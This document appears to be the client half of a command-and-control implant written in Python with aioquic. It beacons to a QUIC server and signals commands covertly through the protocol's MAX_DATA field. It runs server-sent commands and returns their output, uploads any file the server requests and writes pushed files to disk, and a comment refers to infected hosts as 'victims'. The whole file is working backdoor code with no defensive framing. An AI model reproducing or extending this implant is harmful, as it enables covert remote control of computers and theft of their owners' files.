"""A QUIC client that will communicate with the QUIC server."""
import asyncio
from datetime import datetime
import os
from random import randrange
from typing import cast

from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import (QuicEvent, StreamDataReceived)
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.stream import QuicStream
from client.cl_functions import custom_command, stock_command

from client.client_comms import blc
from tools.constants import (DEFAULT_MAX_DATA, Actions, MAX_VLIE_INT,
                             DELIMITER, MAX_BYTES)
from tools.shared_functionality import int_to_enum


class QuicClientSetup():
    """A generic QUIC client."""

    def __init__(self) -> None:
        # A QuicFileLogger is used for tracing events.
        quic_log = 'quic_file_logs'
        try:
            os.mkdir(quic_log)
        except FileExistsError:
            pass
        quic_logger = QuicFileLogger(quic_log)

        # File needed for storing QUIC secrets.
        secrets_log_file = open('secrets_log_file', 'a')

        # A QuicConfiguration object is needed to pass to a QuicConnection.
        self.configuration = QuicConfiguration(
            alpn_protocols=H3_ALPN,
            quic_logger=quic_logger,
            secrets_log_file=secrets_log_file)

        # Load certificate.
        self.configuration.load_verify_locations(
            r'certs\ssl_cert_with_chain.pem')


class QuicClientProtocol(QuicConnectionProtocol):
    """Protocol to handle QUIC interactions.  These protocols MUST inherit
    QuicConnectionProtocol.
    """

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        # Max value per RFC 9000 Section 16.  Value must be divisible by 4
        # (most likely per Section 2.1 but not entirely sure).
        self._quic._local_max_streams_bidi.value = MAX_VLIE_INT
        self._quic._remote_max_streams_bidi = MAX_VLIE_INT

    def quic_event_received(self, event: QuicEvent) -> None:
        """Act upon a QuicEvent that has been received.

        Args:
            event (QuicEvent): A QuicEvent instance.
        """
        # Check to see if server sent a kill command.
        if self._quic._remote_max_data == Actions.CLIENT_KILL.value:
            # Received a kill.  Exit the client.
            raise KeyboardInterrupt

        if isinstance(event, StreamDataReceived):
            # Get the info (most likely a command) from the server.
            info = int_to_enum(self._quic._remote_max_data)
            blc.info(f'Server command is {info.name}')

            # If the server sends a file, this needs to be written to disk
            # as the frames come in (there will most likely be multiple).
            if info == Actions.SERVER_FILE_SEND:
                # TODO: need to get an actual name for the file
                with open('temp', 'ab') as f:
                    f.write(event.data)
                return

            # This is data sent by the server (could be used in custom
            # commands, for instance).
            sd_list = event.data.decode('utf-8').strip().split(DELIMITER)
            # This will strip empty strings and spaces that come from the
            # split() call above.
            server_data = [x.strip() for x in sd_list if x]

            blc.info(f'Data received:  {*server_data,}')

            # Server is requesting a file from the client.
            if info == Actions.SERVER_FILE_RECV:
                # Only one filename will be sent at a time.
                filename = server_data[0]

                try:
                    # Read file contents and send to server.
                    with open(filename, 'rb') as f:
                        while True:  # do-while loop
                            # Need to set this MAX_DATA value for the server.
                            self._quic._local_max_data.value = Actions.CLIENT_FILE_SEND.value
                            # Read MAX_BYTES to stuff into QUIC packet.
                            file_data = f.read(MAX_BYTES)
                            # break when all of the file is read.
                            if not file_data:
                                break
                            self._quic.send_stream_data(
                                event.stream_id, file_data)

                except FileNotFoundError:
                    # Need to set this MAX_DATA value for the server.
                    self._quic._local_max_data.value = Actions.FILE_NOT_FOUND.value
                    # Async task for response.
                    self._quic.send_stream_data(event.stream_id, b'error')

                finally:
                    return

            # Perform a stock or custom command?  Because of the possibility of
            # server_data containing more than one command (because of QUIC
            # packets combined by the library), need to treat both instances as
            # lists below and process as such just in case.  Will most likely
            # be just one command though in reality.
            elif info == Actions.CUSTOM:
                responses = []
                for cmd in server_data:
                    response = custom_command(cmd)
                    responses.append(response)

            else:
                # Get the response by running the command.
                responses = [stock_command(info)]

            for response in responses:
                # Need to set this MAX_DATA value for the server.
                self._quic._local_max_data.value = Actions.CLIENT_RESPONSE.value

                # Send data MAX_BYTES at a time.
                i = 0
                while True:  # do-while
                    self._quic.send_stream_data(event.stream_id,
                                                response[i:i + MAX_BYTES])
                    i += MAX_BYTES
                    if i > len(response):
                        break


async def perform_connect(quic_client: QuicClientSetup,
                          stream_id: int, *, kill: bool = False) -> None:
    """Perform a client connect.

    Args:
        quic_client (QuicClientSetup): A QuicClientSetup instance.
        stream_id (int): The ID to be used by this client as an identifier.
    """
    host = 'localhost'
    port = 443

    # Connect to the server.
    async with connect(host, port, configuration=quic_client.configuration,
                       create_protocol=QuicClientProtocol) as client:
        if kill:
            # Terminate this client and remove from server database.
            client._quic.close(error_code=stream_id, reason_phrase='terminate')
            return

        blc.debug(f'Checking in at {datetime.now().strftime("%H:%M:%S")}')
        data = b'Hello!'

        # cast is only for type checking.
        client = cast(QuicClientProtocol, client)

        # Create a QuicStream object with custom MAX_DATA values.
        # max_stream_data values are nominal for this library (i.e.,
        # these aren't important, just placeholders so API will work).
        # Stream fails unless these are included!
        client._quic._streams[stream_id] = QuicStream(
            stream_id=stream_id,
            max_stream_data_local=DEFAULT_MAX_DATA,
            max_stream_data_remote=DEFAULT_MAX_DATA)

        # This part arms the sending of the info.
        client._quic._local_max_data.value = Actions.CLIENT_HELLO.value
        # Send the message to the server.
        client._quic.send_stream_data(stream_id, data)

        # Beware not setting a value high enough here.  Too low will cause the
        # `quic_event_received()` function above to miss events.
        # TODO implement sync.  Tried threading locks but no luck.
        await asyncio.sleep(randrange(6, 9))


if __name__ == '__main__':
    # Create a QuicClientSetup instance and initialize.
    quic_setup = QuicClientSetup()

    # This stream_id will be used by the server to identify the client.
    # Has to be evenly divisible by 4 to work.  See RFC 9000 Sections 2.1
    # and 16.  Value below gives 26,843,545,501 possible simultaneous stream
    # values.  Hence, little worry that two victims will share a stream_id.
    # Define this value here so that it is consistent across client runs.
    stream_id = randrange(0, MAX_VLIE_INT, 4)

    blc.info('QUIC Client is starting...')
    try:
        while True:
            # Connect to the server.
            asyncio.run(perform_connect(quic_setup, stream_id))
    except KeyboardInterrupt:
        # Yes, here is the stupid way a client must be terminated.  Because
        # the `connect()` function above is actually a context manager, when
        # the user "stops" the program, it actually relaunches and terminates.
        asyncio.run(perform_connect(quic_setup, stream_id, kill=True))
        blc.info('QUIC Client is exiting...')
